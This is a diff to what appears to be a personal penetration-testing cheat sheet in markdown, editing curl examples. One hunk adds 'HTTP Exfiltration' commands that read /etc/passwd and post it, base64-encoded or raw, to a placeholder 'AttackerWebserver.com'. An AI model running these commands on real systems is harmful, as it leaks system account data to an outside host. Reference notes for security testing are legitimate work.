@@ -111,7 +111,7 @@ related:
 
 > [!danger]- CURL 
 > ```
-> curl -v http://Example.com
+> curl http://Example.com -v 
 > ```
 > ```
 > curl -v -X OPTIONS http://Example.com
@@ -141,7 +141,8 @@ related:
 > ```
 > HTTP Exfiltration
 > ```
-> curl example.com -d "$(cat /etc/passwd | base64)"
+> curl AttackerWebserver.com -d "$(cat /etc/passwd | base64)"
+> curl AttackerWebserver.com --data-binary @/etc/passwd
 > ```
 
 > [!danger]- DNS
